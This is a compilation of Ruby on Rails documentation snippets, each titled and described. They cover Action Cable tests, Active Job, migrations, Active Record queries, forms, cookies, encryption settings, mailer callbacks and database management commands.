DESCRIPTION: Tests for Action Cable connection authentication using ActionCable::Connection::TestCase. These examples test connecting with parameters, rejecting connections without parameters, and connecting with cookies.

LANGUAGE: ruby
CODE:
class ApplicationCable::ConnectionTest < ActionCable::Connection::TestCase
  test "connects with params" do
    # Simulate a connection opening by calling the `connect` method
    connect params: { user_id: 42 }

    # You can access the Connection object via `connection` in tests
    assert_equal connection.user_id, "42"
  end

  test "rejects connection without params" do
    # Use `assert_reject_connection` matcher to verify that
    # connection is rejected
    assert_reject_connection { connect }
  end
end

----------------------------------------

TITLE: Testing Job Enqueuing in Rails Models
DESCRIPTION: A test example for verifying that a model method correctly enqueues a job. It uses ActiveJob::TestHelper methods like assert_enqueued_with to check job enqueuing and perform_enqueued_jobs to execute the queued jobs.

LANGUAGE: ruby
CODE:
require "test_helper"

class AccountTest < ActiveSupport::TestCase
  include ActiveJob::TestHelper

  test "#charge_for enqueues billing job" do
    assert_enqueued_with(job: BillingJob) do
      account.charge_for(product)
    end

    assert_not account.reload.charged_for?(product)

    perform_enqueued_jobs

    assert account.reload.charged_for?(product)
  end
end

----------------------------------------

TITLE: Implementing a Class with ActiveModel::Model in Ruby
DESCRIPTION: This example shows how to create a Person class that includes ActiveModel::Model, which provides ActiveModel::API functionality. It demonstrates attribute accessors and initialization with attributes.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Model

  attr_accessor :name, :age
end

----------------------------------------

TITLE: Dynamic Layout Selection in Rails Controller
DESCRIPTION: Example of dynamically selecting a layout at runtime using a method. This allows choosing different layouts based on user attributes or other conditions.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  layout :products_layout

  def show
    @product = Product.find(params[:id])
  end

  private
    def products_layout
      @current_user.special? ? "special" : "products"
    end
end

----------------------------------------

TITLE: Creating a Migration for a New Table with belongs_to Association
DESCRIPTION: Demonstrates how to create a migration for a new books table that includes a foreign key for the belongs_to :author association.

LANGUAGE: ruby
CODE:
class CreateBooks < ActiveRecord::Migration[8.1]
  def change
    create_table :books do |t|
      t.datetime   :published_at
      t.string     :book_number
      t.belongs_to :author
    end
  end
end

----------------------------------------

TITLE: Joining a Single Association in ActiveRecord
DESCRIPTION: Demonstrates how to use the joins method with a named association. This query joins the books and reviews tables to find all books that have at least one review, using the association name as a shortcut.

LANGUAGE: ruby
CODE:
Book.joins(:reviews)

LANGUAGE: sql
CODE:
SELECT books.* FROM books
  INNER JOIN reviews ON reviews.book_id = books.id

----------------------------------------

TITLE: Using Block Initialization with Active Record in Rails
DESCRIPTION: Shows how to initialize a new Active Record object using a block with the new method. The block provides a cleaner way to set multiple attributes during initialization.

LANGUAGE: ruby
CODE:
book = Book.new do |b|
  b.title = "Metaprogramming Ruby 2"
  b.author = "Paolo Perrotta"
end

book.save

----------------------------------------

TITLE: Creating a New Product Instance in Rails
DESCRIPTION: Example of instantiating a new Product object with a name attribute. This creates the object in memory but doesn't save it to the database yet.

LANGUAGE: irb
CODE:
store(dev)> product = Product.new(name: "T-Shirt")
=> #<Product:0x000000012e616c30 id: nil, name: "T-Shirt", created_at: nil, updated_at: nil>

----------------------------------------

TITLE: Migration with Column Modifiers
DESCRIPTION: Migration file that demonstrates adding columns with modifiers to the products table, including a decimal column with precision and scale, and a polymorphic reference.

LANGUAGE: ruby
CODE:
class AddDetailsToProducts < ActiveRecord::Migration[8.1]
  def change
    add_column :products, :price, :decimal, precision: 5, scale: 2
    add_reference :products, :supplier, polymorphic: true
  end
end

----------------------------------------

TITLE: Using assert_recognizes for Testing Route Recognition in Rails
DESCRIPTION: Tests that the routing of a given path was handled correctly and that the parsed options match expected options.

LANGUAGE: ruby
CODE:
assert_recognizes(expected_options, path, extras = {}, message = nil)

----------------------------------------

TITLE: Manual File Upload with multipart attribute
DESCRIPTION: Shows how to manually set the multipart attribute when creating a file upload form without using a model. This approach uses form_with with a URL and file_field_tag instead of the model-based approach.

LANGUAGE: erb
CODE:
<%= form_with url: "/uploads", multipart: true do |form| %>
  <%= file_field_tag :csv_file %>
<% end %>

----------------------------------------

TITLE: Rendering Content with a Layout Block in ERB
DESCRIPTION: An alternative approach to rendering content with a layout by passing a block to the render method instead of using a separate partial.

LANGUAGE: html+erb
CODE:
<%# app/views/articles/show.html.erb %>
<%= render(layout: 'box', locals: { article: @article }) do %>
  <div>
    <p><%= article.body %></p>
  </div>
<% end %>

----------------------------------------

TITLE: Generating a Migration for Books Table Using Rails Command
DESCRIPTION: Rails command to generate a migration file for creating a books table with title and author columns.

LANGUAGE: bash
CODE:
$ bin/rails generate migration CreateBooks title:string author:string

----------------------------------------

TITLE: Filtering Sensitive Parameters in Rails Logs
DESCRIPTION: Shows how to filter sensitive parameters from Rails application logs. The example adds 'password' to the list of parameters that will be marked as [FILTERED] in the log files.

LANGUAGE: ruby
CODE:
config.filter_parameters << :password

----------------------------------------

TITLE: SQL Generated by Active Record Save Operations
DESCRIPTION: Shows the SQL generated by Active Record when saving a record to the database. Both created_at and updated_at timestamp fields are automatically set during this operation.

LANGUAGE: sql
CODE:
/* Note that `created_at` and `updated_at` are automatically set. */

INSERT INTO "books" ("title", "author", "created_at", "updated_at") VALUES (?, ?, ?, ?) RETURNING "id"  [["title", "Metaprogramming Ruby 2"], ["author", "Paolo Perrotta"], ["created_at", "2024-02-22 20:01:18.469952"], ["updated_at", "2024-02-22 20:01:18.469952"]]

----------------------------------------

TITLE: Ordering by Multiple Fields in Rails Queries
DESCRIPTION: Shows various ways to order query results by multiple fields with different sort directions.

LANGUAGE: ruby
CODE:
Book.order(title: :asc, created_at: :desc)
# OR
Book.order(:title, created_at: :desc)
# OR
Book.order("title ASC, created_at DESC")
# OR
Book.order("title ASC", "created_at DESC")

----------------------------------------

TITLE: Working with Encrypted and Signed Cookies in Rails
DESCRIPTION: Demonstrates how to use the signed and encrypted cookie jars for secure data storage. This example shows storing a user ID and an expiration date securely in cookies.

LANGUAGE: ruby
CODE:
class CookiesController < ApplicationController
  def set_cookie
    cookies.signed[:user_id] = current_user.id
    cookies.encrypted[:expiration_date] = Date.tomorrow # => Thu, 20 Mar 2024
    redirect_to action: "read_cookie"
  end

  def read_cookie
    cookies.encrypted[:expiration_date] # => "2024-03-20"
  end
end

----------------------------------------

TITLE: Creating a Table with Column Indexes
DESCRIPTION: Migration that creates a table with indexes on columns, including a simple index and a unique index with a custom name.

LANGUAGE: ruby
CODE:
create_table :users do |t|
  t.string :name, index: true
  t.string :email, index: { unique: true, name: "unique_emails" }
end

----------------------------------------

TITLE: Switching Database Connections for Specific Models in Ruby on Rails
DESCRIPTION: Demonstrates how to switch database connections for specific abstract connection classes without affecting other connections. This allows some queries to read from replicas while others continue to read from the primary database.

LANGUAGE: ruby
CODE:
AnimalsRecord.connected_to(role: :reading) do
  Dog.first # Reads from animals_replica.
  Person.first  # Reads from primary.
end

----------------------------------------

TITLE: Using Secret Key Base in Rails Credentials
DESCRIPTION: Example of how the secret_key_base is stored in the Rails credentials.yml.enc file. This secret is used for encrypting and signing cookies in a Rails application.

LANGUAGE: yaml
CODE:
secret_key_base: 492f...

----------------------------------------

TITLE: Creating migration for a has_and_belongs_to_many relationship in Rails
DESCRIPTION: Migration for setting up tables needed for a has_and_belongs_to_many relationship between assemblies and parts, including a join table without a primary key (id: false).

LANGUAGE: ruby
CODE:
class CreateAssembliesAndParts < ActiveRecord::Migration[8.1]
  def change
    create_table :assemblies do |t|
      t.string :name
      t.timestamps
    end

    create_table :parts do |t|
      t.string :part_number
      t.timestamps
    end

    # Create a join table to establish the many-to-many relationship between assemblies and parts.
    # `id: false` indicates that the table does not need a primary key of its own
    create_table :assemblies_parts, id: false do |t|
      # creates foreign keys linking the join table to the `assemblies` and `parts` tables
      t.belongs_to :assembly
      t.belongs_to :part
    end
  end
end

----------------------------------------

TITLE: Generating a Model with Rails Generator
DESCRIPTION: Creates a new model with specified columns using the Rails generator command. This generates both a model file and a migration file for creating the corresponding database table.

LANGUAGE: bash
CODE:
$ bin/rails generate model Product name:string description:text

----------------------------------------

TITLE: Creating a Custom FormBuilder Subclass
DESCRIPTION: Defines a custom FormBuilder by subclassing ActionView::Helpers::FormBuilder. This LabellingFormBuilder adds a label to every text_field automatically by overriding the text_field method and calling super to access the original implementation.

LANGUAGE: ruby
CODE:
class LabellingFormBuilder < ActionView::Helpers::FormBuilder
  def text_field(attribute, options = {})
    # super will call the original text_field method
    label(attribute) + super
  end
end

----------------------------------------

TITLE: Switching database system in Rails application
DESCRIPTION: Command to change the database adapter of a Rails application, which updates the configuration files and Gemfile. This example shows switching from SQLite to PostgreSQL.

LANGUAGE: bash
CODE:
$ rails db:system:change --to=postgresql
    conflict  config/database.yml
Overwrite config/database.yml? (enter "h" for help) [Ynaqdhm] Y
       force  config/database.yml
        gsub  Gemfile
        gsub  Gemfile
...

----------------------------------------

TITLE: Creating a Custom Mailer Manually
DESCRIPTION: Demonstrates how to manually create a custom mailer class without using the generator. The class must inherit from ApplicationMailer.

LANGUAGE: ruby
CODE:
# app/mailers/custom_mailer.rb
class CustomMailer < ApplicationMailer
end

----------------------------------------

TITLE: Fixed Implementation Using Redirect in Rails Controller
DESCRIPTION: A better implementation using redirect_to instead of render, ensuring that the index action is fully executed and the necessary @books variable is properly initialized.

LANGUAGE: ruby
CODE:
def index
  @books = Book.all
end

def show
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    redirect_to action: :index
  end
end

----------------------------------------

TITLE: Creating a Migration with Custom Output Control
DESCRIPTION: This migration demonstrates how to control output messages using suppress_messages, say, and say_with_time methods provided by Rails migrations.

LANGUAGE: ruby
CODE:
class CreateProducts < ActiveRecord::Migration[8.1]
  def change
    suppress_messages do
      create_table :products do |t|
        t.string :name
        t.text :description
        t.timestamps
      end
    end

    say "Created a table"

    suppress_messages { add_index :products, :name }
    say "and an index!", true

    say_with_time "Waiting for a while" do
      sleep 10
      250
    end
  end
end

----------------------------------------

TITLE: Using I18n Translation Helper in Rails View
DESCRIPTION: Shows how to use the translate (t) helper in a Rails view to internationalize text. This example translates a simple 'hello' key from the locale files.

LANGUAGE: erb
CODE:
<h1><%= t "hello" %></h1>

----------------------------------------

TITLE: Configuring Enqueue After Transaction Commit
DESCRIPTION: Example of setting up ApplicationJob to ensure jobs are only enqueued after the database transaction commits. This helps avoid relying accidentally on transactional integrity between jobs and application data.

LANGUAGE: ruby
CODE:
class ApplicationJob < ActiveJob::Base
  self.enqueue_after_transaction_commit = true
end

----------------------------------------

TITLE: Generating a Job with a Specific Queue in Rails
DESCRIPTION: Creates a new background job that will run on a specified queue ('urgent' in this example). Useful for prioritizing certain types of jobs.

LANGUAGE: bash
CODE:
$ bin/rails generate job guests_cleanup --queue urgent

----------------------------------------

TITLE: SQL Generated by Destroy Operation in Rails
DESCRIPTION: Shows the SQL generated by the destroy method, demonstrating how Active Record translates the destroy operation into a SQL DELETE statement with the appropriate WHERE clause.

LANGUAGE: sql
CODE:
DELETE FROM "books" WHERE "books"."id" = ?  [["id", 104]]

----------------------------------------

TITLE: Active Storage Fixtures in Rails Testing
DESCRIPTION: Example of how to create fixtures for Active Storage attachments. Shows the model definition with attachment and the YAML fixtures needed for both blobs and attachments.

LANGUAGE: ruby
CODE:
class Article < ApplicationRecord
  has_one_attached :thumbnail
end

LANGUAGE: yaml
CODE:
# test/fixtures/articles.yml
first:
  title: An Article

LANGUAGE: yaml
CODE:
# test/fixtures/active_storage/blobs.yml
first_thumbnail_blob: <%= ActiveStorage::FixtureSet.blob filename: "first.png" %>

LANGUAGE: yaml
CODE:
# test/fixtures/active_storage/attachments.yml
first_thumbnail_attachment:
  name: thumbnail
  record: first (Article)
  blob: first_thumbnail_blob

----------------------------------------

TITLE: Testing Email Delivery in Integration Tests with Rails
DESCRIPTION: An integration test example demonstrating how to verify that an invite friend action correctly sends an email. The test uses assert_emails to check that exactly one email is sent when the invite_friend_url endpoint is called.

LANGUAGE: ruby
CODE:
# Integration Test
require "test_helper"

class UsersControllerTest < ActionDispatch::IntegrationTest
  test "invite friend" do
    # Asserts the difference in the ActionMailer::Base.deliveries
    assert_emails 1 do
      post invite_friend_url, params: { email: "friend@example.com" }
    end
  end
end

----------------------------------------

TITLE: Processing an Uploaded CSV File in a Controller
DESCRIPTION: Ruby code showing how to handle a CSV file upload in a controller action. It reads the uploaded file, parses it as CSV with headers, and processes each row of data. This example demonstrates accessing the uploaded file via params.

LANGUAGE: ruby
CODE:
  require "csv"

  def upload
    uploaded_file = params[:csv_file]
    if uploaded_file.present?
      csv_data = CSV.parse(uploaded_file.read, headers: true)
      csv_data.each do |row|
        # Process each row of the CSV file
        # SomeInvoiceModel.create(amount: row['Amount'], status: row['Status'])
        Rails.logger.info row.inspect
        #<CSV::Row "id":"po_1KE3FRDSYPMwkcNz9SFKuaYd" "Amount":"96.22" "Created (UTC)":"2022-01-04 02:59" "Arrival Date (UTC)":"2022-01-05 00:00" "Status":"paid">
      end
    end
    # ...
  end

----------------------------------------

TITLE: Using Session-based Authentication for Action Cable in Rails
DESCRIPTION: Alternate approach for finding a verified user when using session cookies. This snippet demonstrates how to extract the user ID from the session cookie when your application uses cookie-based sessions.

LANGUAGE: ruby
CODE:
verified_user = User.find_by(id: cookies.encrypted["_session"]["user_id"])

----------------------------------------

TITLE: Customizing Shallow Routes with shallow_prefix Option in Rails
DESCRIPTION: Shows how to use the shallow_prefix option to add a prefix to the route helper names for shallow routes, which affects the generated helper method names but not the actual URLs.

LANGUAGE: ruby
CODE:
scope shallow_prefix: "sekret" do
  resources :articles do
    resources :comments, shallow: true
  end
end

----------------------------------------

TITLE: Permitting Rich Text Content in Controller
DESCRIPTION: Controller code showing how to permit rich text content as a parameter when creating an article, which is necessary for accepting updates from the Trix editor.

LANGUAGE: ruby
CODE:
class ArticlesController < ApplicationController
  def create
    article = Article.create! params.expect(article: [:title, :content])
    redirect_to article
  end
end

----------------------------------------

TITLE: Setting Strong ETag Directly on Rails Response
DESCRIPTION: Example showing how to manually set a strong ETag directly on the response object in Rails. This approach allows direct control over the ETag generation based on the response body.

LANGUAGE: ruby
CODE:
response.strong_etag = response.body # => "618bbc92e2d35ea1945008b42799b0e7"

----------------------------------------

TITLE: Using the :shallow Option for Nested Resources in Rails
DESCRIPTION: Shows how to use the :shallow option to automatically create shallow routes for nested resources. This achieves the same result as manually specifying nested and non-nested routes but with less code.

LANGUAGE: ruby
CODE:
resources :articles do
  resources :comments, shallow: true
end

----------------------------------------

TITLE: Using Complex Objects as Cache Keys in Rails
DESCRIPTION: Demonstrates using Hashes and Arrays as cache keys with Rails.cache. Rails will handle modifying these keys to fit the storage engine constraints while maintaining uniqueness.

LANGUAGE: ruby
CODE:
# This is a valid cache key
Rails.cache.read(site: "mysite", owners: [owner_1, owner_2])

----------------------------------------

TITLE: Protecting Encrypted Data in Rails While Running Code
DESCRIPTION: Shows how to run code with encryption disabled but prevent overwriting existing encrypted content, useful for safely examining encrypted data in environments like the Rails console.

LANGUAGE: ruby
CODE:
ActiveRecord::Encryption.protecting_encrypted_data do
  # ...
end

----------------------------------------

TITLE: Correct Configuration for Autoload Paths
DESCRIPTION: The proper way to configure autoload_paths without wildcards. This ensures that the path represents the top-level namespace correctly for the autoloader to work properly.

LANGUAGE: ruby
CODE:
config.autoload_paths << "#{config.root}/lib"

----------------------------------------

TITLE: Creating a Custom Scaffold Template in ERB
DESCRIPTION: An ERB template that overrides Rails' default scaffold index view. This template is placed in lib/templates/erb/scaffold/ to customize the output of the scaffold generator.

LANGUAGE: erb
CODE:
<%% @<%= plural_table_name %>.count %> <%= human_name.pluralize %>

----------------------------------------

TITLE: Creating Action Text HTML Attachment with sgid
DESCRIPTION: Example of HTML markup for an Action Text attachment using a signed global ID (sgid) to reference a model.

LANGUAGE: html
CODE:
<action-text-attachment sgid="BAh7CEkiCGâ¦"></action-text-attachment>

----------------------------------------

TITLE: Using Spacer Templates with Rails Collection Partials
DESCRIPTION: Demonstrates how to insert a spacer template between instances of the main partial when rendering collections using the :spacer_template option.

LANGUAGE: erb
CODE:
<%= render partial: @products, spacer_template: "product_ruler" %>

----------------------------------------

TITLE: Configuring Custom Logger for ActiveStorage in Rails
DESCRIPTION: Sets a custom logger for ActiveStorage operations. This example redirects logging to STDOUT rather than the default Rails logger.

LANGUAGE: ruby
CODE:
config.active_storage.logger = ActiveSupport::Logger.new(STDOUT)

----------------------------------------

TITLE: Record Identification for Existing Records in Rails
DESCRIPTION: Shows how form_with automatically generates the correct action URL and HTTP method for an existing Article model instance. Rails determines this based on the model's persisted? status.

LANGUAGE: ruby
CODE:
# longer way:
form_with(model: @article, url: article_path(@article), method: "patch")
# short-hand:
form_with(model: @article)

----------------------------------------

TITLE: Difference Between after_save and after_commit
DESCRIPTION: Example showing how after_save behaves differently from after_commit. With after_save, if an exception occurs, the transaction rolls back and the user isn't saved.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  after_save do
    # If this fails the user won't be saved.
    EventLog.create!(event: "user_saved")
  end
end

----------------------------------------

TITLE: Generating a Controller with Actions
DESCRIPTION: Demonstrates generating a Greetings controller with a hello action. The output shows all the files that are created, including controller, view, test, and helper files.

LANGUAGE: bash
CODE:
$ bin/rails generate controller Greetings hello
     create  app/controllers/greetings_controller.rb
      route  get 'greetings/hello'
     invoke  erb
     create    app/views/greetings
     create    app/views/greetings/hello.html.erb
     invoke  test_unit
     create    test/controllers/greetings_controller_test.rb
     invoke  helper
     create    app/helpers/greetings_helper.rb
     invoke    test_unit

----------------------------------------

TITLE: Implementing after_deliver and before_deliver callbacks in ActionMailer
DESCRIPTION: Shows how to use ActionMailer callbacks to execute code before and after email delivery. Demonstrates after_deliver for recording delivery information, and before_deliver for modifying email destinations in staging environments.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  after_deliver :mark_delivered
  before_deliver :sandbox_staging
  after_deliver :observe_delivery

  def feedback_message
    @feedback = params[:feedback]
  end

  private
    def mark_delivered
      params[:feedback].touch(:delivered_at)
    end

    # An Interceptor alternative.
    def sandbox_staging
      message.to = ["sandbox@example.com"] if Rails.env.staging?
    end

    # A callback has more context than the comparable Observer example.
    def observe_delivery
      EmailDelivery.log(message, self.class, action_name, params)
    end
end

----------------------------------------

TITLE: Implementing Token Generation with ActiveRecord::Base.generates_token_for
DESCRIPTION: Example showing how to use the new generates_token_for method to create secure, expiring tokens for password reset functionality. The tokens automatically invalidate when the relevant data changes.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  has_secure_password

  generates_token_for :password_reset, expires_in: 15.minutes do
    # `password_salt` (defined by `has_secure_password`) returns the salt for
    # the password. The salt changes when the password is changed, so the token
    # will expire when the password is changed.
    password_salt&.last(10)
  end
end

user = User.first
token = user.generate_token_for(:password_reset)

User.find_by_token_for(:password_reset, token) # => user

user.update!(password: "new password")
User.find_by_token_for(:password_reset, token) # => nil

----------------------------------------

TITLE: Creating a New API-only Rails Application
DESCRIPTION: Command to generate a new Rails application configured for API-only functionality. This creates an app with limited middleware, API-focused controllers, and skips generating views and assets.

LANGUAGE: bash
CODE:
$ rails new my_api --api

----------------------------------------

TITLE: Using Rails.error.handle to Report and Swallow Errors
DESCRIPTION: Example of using Rails.error.handle to capture and report a TypeError while continuing execution. The method returns nil when an error occurs.

LANGUAGE: ruby
CODE:
result = Rails.error.handle do
  1 + "1" # raises TypeError
end
result # => nil
1 + 1 # This will be executed

----------------------------------------

TITLE: Working with Namespaced Routes in form_with
DESCRIPTION: Shows how to use form_with with namespaced routes by passing an array to the model parameter. This example targets an admin namespaced controller.

LANGUAGE: ruby
CODE:
form_with model: [:admin, @article]

----------------------------------------

TITLE: Configuring Attribute-specific Key Providers in Active Record
DESCRIPTION: Sets a specific key provider for an individual attribute using the :key_provider option. This allows different attributes to use different key management strategies.

LANGUAGE: ruby
CODE:
class Article < ApplicationRecord
  encrypts :summary, key_provider: ArticleKeyProvider.new
end

----------------------------------------

TITLE: Generating a Reference/Association Migration in Rails
DESCRIPTION: This command generates a migration to add a foreign key reference to the user table in the products table, facilitating an association between Products and Users.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddUserRefToProducts user:references

----------------------------------------

TITLE: Using outline Command in Rails Debugger
DESCRIPTION: Example showing the output of the outline command, which displays accessible items from the current scope, including local and instance variables, class variables, and methods.

LANGUAGE: ruby
CODE:
ActiveSupport::Configurable#methods: config
AbstractController::Base#methods:
  action_methods  action_name  action_name=  available_action?  controller_path  inspect
  response_body
ActionController::Metal#methods:
  content_type       content_type=  controller_name  dispatch          headers
  location           location=      media_type       middleware_stack  middleware_stack=
  middleware_stack?  performed?     request          request=          reset_session
  response           response=      response_body=   response_code     session
  set_request!       set_response!  status           status=           to_a
ActionView::ViewPaths#methods:
  _prefixes  any_templates?  append_view_path   details_for_lookup  formats     formats=  locale
  locale=    lookup_context  prepend_view_path  template_exists?    view_paths
AbstractController::Rendering#methods: view_assigns

# .....

PostsController#methods: create  destroy  edit  index  new  show  update
instance variables:
  @_action_has_layout  @_action_name    @_config  @_lookup_context                      @_request
  @_response           @_response_body  @_routes  @marked_for_same_origin_verification  @posts
  @rendered_format
class variables: @@raise_on_open_redirects

----------------------------------------

TITLE: Testing Exception Handling in Rails Jobs
DESCRIPTION: An example of testing that a job raises an exception under specific conditions. This test directly calls the job's perform method to check that the correct exception is raised and that no side effects occur.

LANGUAGE: ruby
CODE:
require "test_helper"

class BillingJobTest < ActiveJob::TestCase
  test "does not charge accounts with insufficient funds" do
    assert_raises(InsufficientFundsError) do
      BillingJob.new(empty_account, product).perform
    end
    assert_not account.reload.charged_for?(product)
  end
end

----------------------------------------

TITLE: Creating Forms with Non-POST HTTP Methods in Rails
DESCRIPTION: Shows how Rails works around HTML forms' limitation of only supporting GET and POST by using a hidden _method input field to emulate other HTTP methods like PATCH.

LANGUAGE: ruby
CODE:
form_with(url: search_path, method: "patch")

----------------------------------------

TITLE: Defining Author model with Active Record associations in Ruby
DESCRIPTION: Defines an Author class that inherits from ApplicationRecord with a has_many relationship to books, ordered by publication year in descending order.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books, -> { order(year_published: :desc) }
end

----------------------------------------

TITLE: SQL Generated by Update Operations in Rails
DESCRIPTION: Shows the SQL generated by the update method, demonstrating how Active Record translates update operations into SQL UPDATE statements. The updated_at timestamp is automatically updated.

LANGUAGE: sql
CODE:
/* Note that `updated_at` is automatically set. */

 UPDATE "books" SET "title" = ?, "updated_at" = ? WHERE "books"."id" = ?  [["title", "The Lord of the Rings: The Fellowship of the Ring"], ["updated_at", "2024-02-22 20:51:13.487064"], ["id", 104]]

----------------------------------------

TITLE: YAML Configuration File Structure
DESCRIPTION: Example of a YAML configuration file with environment-specific settings for a payment system, including merchant IDs and keys for different environments.

LANGUAGE: yaml
CODE:
# config/payment.yml
production:
  environment: production
  merchant_id: production_merchant_id
  public_key:  production_public_key
  private_key: production_private_key

development:
  environment: sandbox
  merchant_id: development_merchant_id
  public_key:  development_public_key
  private_key: development_private_key

----------------------------------------

TITLE: Configuring Active Record Encryption with Environment Variables
DESCRIPTION: Configuration example showing how to set Active Record Encryption keys using environment variables instead of storing them directly in the credentials file.

LANGUAGE: ruby
CODE:
config.active_record.encryption.primary_key = ENV["ACTIVE_RECORD_ENCRYPTION_PRIMARY_KEY"]
config.active_record.encryption.deterministic_key = ENV["ACTIVE_RECORD_ENCRYPTION_DETERMINISTIC_KEY"]
config.active_record.encryption.key_derivation_salt = ENV["ACTIVE_RECORD_ENCRYPTION_KEY_DERIVATION_SALT"]

----------------------------------------

TITLE: Displaying Links for Authenticated Users in Rails ERB
DESCRIPTION: Shows how to conditionally display a 'New product' link in the product index page only when the user is authenticated. This uses the authenticated? helper method to check user login status.

LANGUAGE: erb
CODE:
<%= link_to "New product", new_product_path if authenticated? %>

----------------------------------------

TITLE: Rendering Partials in Rails Views
DESCRIPTION: Demonstrates how to render partial templates in Rails views. Shows basic syntax for rendering partials from the same or different directories.

LANGUAGE: html+erb
CODE:
<%= render "menu" %>

LANGUAGE: html+erb
CODE:
<%= render "application/menu" %>

----------------------------------------

TITLE: Configuring Rails to Use Standalone Action Cable Server
DESCRIPTION: Ruby configuration in the development environment to connect Rails to a standalone Action Cable server. It sets the WebSocket URL and disables the mount path within the main application.

LANGUAGE: ruby
CODE:
# config/environments/development.rb
Rails.application.configure do
  config.action_cable.mount_path = nil
  config.action_cable.url = "ws://localhost:28080" # use wss:// in production
end

----------------------------------------

TITLE: Defining a View Helper for User Links in Rails
DESCRIPTION: Demonstrates creating a view helper that generates links to user profiles. The helper concatenates the user's first and last name and creates a link to the user's profile page.

LANGUAGE: ruby
CODE:
module UsersHelper
  def link_to_user(user)
    link_to "#{user.first_name} #{user.last_name}", user
  end
end

----------------------------------------

TITLE: Using Validations in Ruby IRB Console
DESCRIPTION: This example demonstrates how to use the validation methods in a Ruby class. It shows creating a Person object, testing validity with different attribute values, and handling strict validations that raise exceptions.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.token = "2b1f325"
irb> person.valid?
=> false

irb> person.name = "Jane Doe"
irb> person.email = "me"
irb> person.valid?
=> false

irb> person.email = "jane.doe@gmail.com"
irb> person.valid?
=> true

# `token` uses validate! and will raise an exception when not set.
irb> person.token = nil
irb> person.valid?
=> "Token can't be blank (ActiveModel::StrictValidationFailed)"

----------------------------------------

TITLE: Implementing Validation Callbacks in Ruby on Rails
DESCRIPTION: Demonstrates validation callbacks that are triggered when a record is validated. This example shows before_validation callbacks that titleize the name and after_validation callbacks that log validation errors.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :name, presence: true
  before_validation :titleize_name
  after_validation :log_errors

  private
    def titleize_name
      self.name = name.downcase.titleize if name.present?
      Rails.logger.info("Name titleized to #{name}")
    end

    def log_errors
      if errors.any?
        Rails.logger.error("Validation failed: #{errors.full_messages.join(', ')}")
      end
    end
end

LANGUAGE: irb
CODE:
irb> user = User.new(name: "", email: "john.doe@example.com", password: "abc123456")
=> #<User id: nil, email: "john.doe@example.com", created_at: nil, updated_at: nil, name: "">

irb> user.valid?
Name titleized to
Validation failed: Name can't be blank
=> false

----------------------------------------

TITLE: Configuring Custom WebSocket URLs for Action Cable in JavaScript
DESCRIPTION: Advanced examples of creating Action Cable consumers with custom WebSocket URLs. Shows how to specify static URLs for different environments and dynamically generate URLs using functions, such as for adding auth tokens.

LANGUAGE: javascript
CODE:
// Specify a different URL to connect to
createConsumer('wss://example.com/cable')
// Or when using websockets over HTTP
createConsumer('https://ws.example.com/cable')

// Use a function to dynamically generate the URL
createConsumer(getWebSocketURL)

function getWebSocketURL() {
  const token = localStorage.get('auth-token')
  return `wss://example.com/cable?token=${token}`
}

----------------------------------------

TITLE: Using after_commit Callback for Safe File Deletion
DESCRIPTION: Improved implementation using after_commit with the :on option to specify that the callback should only fire on destroy actions. This ensures the file is only deleted after the transaction is committed.

LANGUAGE: ruby
CODE:
class PictureFile < ApplicationRecord
  after_commit :delete_picture_file_from_disk, on: :destroy

  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end

----------------------------------------

TITLE: Adding Base Errors for Object-Level Validation
DESCRIPTION: This code demonstrates how to add errors that apply to the entire object rather than a specific attribute using :base as the attribute. This is useful for validations that affect the object as a whole.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validate do |person|
    errors.add :base, :invalid, message: "This person is invalid because ..."
  end
end

----------------------------------------

TITLE: Configuring Content Types to Serve as Binary in ActiveStorage
DESCRIPTION: Specifies which content types should always be served as attachments rather than inline. This prevents certain potentially unsafe content types from being displayed directly in browsers.

LANGUAGE: ruby
CODE:
config.active_storage.content_types_to_serve_as_binary = %w(text/html image/svg+xml application/postscript application/x-shockwave-flash text/xml application/xml application/xhtml+xml application/mathml+xml text/cache-manifest)

----------------------------------------

TITLE: Rails Database Management Commands for Multiple Databases
DESCRIPTION: A list of Rails command-line tasks available for managing multiple databases, including creating, dropping, migrating, and resetting databases.

LANGUAGE: bash
CODE:
$ bin/rails --help
...
db:create                          # Create the database from DATABASE_URL or config/database.yml for the ...
db:create:animals                  # Create animals database for current environment
db:create:primary                  # Create primary database for current environment
db:drop                            # Drop the database from DATABASE_URL or config/database.yml for the cu...
db:drop:animals                    # Drop animals database for current environment
db:drop:primary                    # Drop primary database for current environment
db:migrate                         # Migrate the database (options: VERSION=x, VERBOSE=false, SCOPE=blog)
db:migrate:animals                 # Migrate animals database for current environment
db:migrate:primary                 # Migrate primary database for current environment
db:migrate:status                  # Display status of migrations
db:migrate:status:animals          # Display status of migrations for animals database
db:migrate:status:primary          # Display status of migrations for primary database
db:reset                           # Drop and recreates all databases from their schema for the current environment and loads the seeds
db:reset:animals                   # Drop and recreates the animals database from its schema for the current environment and loads the seeds
db:reset:primary                   # Drop and recreates the primary database from its schema for the current environment and loads the seeds
db:rollback                        # Roll the schema back to the previous version (specify steps w/ STEP=n)
db:rollback:animals                # Rollback animals database for current environment (specify steps w/ STEP=n)
db:rollback:primary                # Rollback primary database for current environment (specify steps w/ STEP=n)
db:schema:dump                     # Create a database schema file (either db/schema.rb or db/structure.sql  ...
db:schema:dump:animals             # Create a database schema file (either db/schema.rb or db/structure.sql  ...
db:schema:dump:primary             # Create a db/schema.rb file that is portable against any DB supported  ...
db:schema:load                     # Load a database schema file (either db/schema.rb or db/structure.sql  ...
db:schema:load:animals             # Load a database schema file (either db/schema.rb or db/structure.sql  ...
db:schema:load:primary             # Load a database schema file (either db/schema.rb or db/structure.sql  ...
db:setup                           # Create all databases, loads all schemas, and initializes with the seed data (use db:reset to also drop all databases first)
db:setup:animals                   # Create the animals database, loads the schema, and initializes with the seed data (use db:reset:animals to also drop the database first)
